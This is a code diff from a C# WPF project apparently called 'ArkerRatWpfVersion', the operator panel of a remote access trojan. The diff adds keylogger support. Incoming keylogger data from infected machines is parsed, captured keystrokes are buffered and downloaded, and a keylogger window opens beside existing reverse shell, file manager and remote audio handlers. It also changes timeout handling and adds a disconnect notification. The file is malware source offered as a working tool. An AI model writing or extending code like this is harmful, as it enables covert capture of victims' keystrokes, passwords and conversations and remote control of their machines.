@@ -98,6 +98,8 @@ namespace ArkerRatWpfVersion
                             await Task.Run(() => SortData("§ReverseShellStart§", "§ReverseShellEnd§"));
                             await Task.Run(() => SortData("§FileManagerStart§", "§FileManagerEnd§"));
                             await Task.Run(() => SortData("§RemoteAudioStart§", "§RemoteAudioEnd§"));
+                            await Task.Run(() => SortData("§KeyLoggerStart§", "§KeyLoggerEnd§"));
+
 
                             stringBuilder.Clear();
                         }
@@ -180,8 +182,34 @@ namespace ArkerRatWpfVersion
                             }
                             else
                             {
-                                fileManagerWindow.GenerateFileSystem(subString);
+                               Task.Run(()=>fileManagerWindow.GenerateFileSystem(subString));
                             }
+                        }
+                        else if(startDelimiter == "§KeyLoggerStart§")
+                        {
+                            if (subString.Contains("§OFK§"))
+                            {
+                                subString = subString.Replace("§OFK§", string.Empty);
+
+                                if (subString == "start")
+                                {
+                                    Task.Run(() => keyLoggerWindow.StartDownloadingFile());
+                                }
+                                else if (subString == "end")
+                                {
+                                    keyLoggerWindow.download= false;
+                                    keyLoggerWindow.dataBuffer = new ConcurrentQueue<string>();
+                                }
+                                else
+                                {
+                                    keyLoggerWindow.AddDataToBuffer(subString);
+                                }
+                            }
+                            else
+                            {
+                                keyLoggerWindow.WriteKeyInputToTextBox(subString);
+                            }
+                            
                         }
                         else if (startDelimiter == "§PingStart§")
                         {
@@ -229,18 +257,17 @@ namespace ArkerRatWpfVersion
                         whenToStartPinging = "Wait for callback";
                         await SendData("§PingStart§§PingEnd§");
                     }
-
-                    if (whenToStartPinging == "§Ping§")
+                    else if (whenToStartPinging == "§Ping§")
                     {
                         ms = stopwatch.ElapsedMilliseconds;
                         whenToStartPinging = "";
                         stopwatch.Stop();
                     }
-                    
-                    if (stopwatch.ElapsedMilliseconds == 10000)
+                    else if(stopwatch.ElapsedMilliseconds > 10000)
                     {
                         stopwatch.Stop();
                         RemoveThisClientUI();
+                        await GlobalMethods.ShowNotification("Client disconnected",clientInfo[0]+ " disconnected, timed out");
                         await SendData("§ReconnectStart§§ReconnectEnd§");
                     }
                     await Task.Delay(1);
@@ -318,6 +345,15 @@ namespace ArkerRatWpfVersion
                 }));
             }
             catch (Exception ex) { }
+
+            try
+            {
+                remoteAudioWindow.Dispatcher.BeginInvoke(new Action(() =>
+                {
+                    keyLoggerWindow.CloseWindow(null, null);
+                }));
+            }
+            catch (Exception ex) { }
         }
 
         public ReverseShellWindow reverseShellWindow;
@@ -369,6 +405,19 @@ namespace ArkerRatWpfVersion
                 remoteAudioWindow.WindowState = WindowState.Normal;
                 remoteAudioWindow.Activate();
                 remoteAudioWindow.Show();
+            }
+        }
+
+        public KeyLoggerWindow keyLoggerWindow;
+        public bool keyLoggerWindowIsAlreadyOpen = false;
+        public void StartKeyLogger(object sender, EventArgs e)
+        {
+            if (!keyLoggerWindowIsAlreadyOpen)
+            {
+                keyLoggerWindow = new KeyLoggerWindow(this);
+                keyLoggerWindow.WindowState = WindowState.Normal;
+                keyLoggerWindow.Activate();
+                keyLoggerWindow.Show();
             }
         }
         //____________________________________________________________
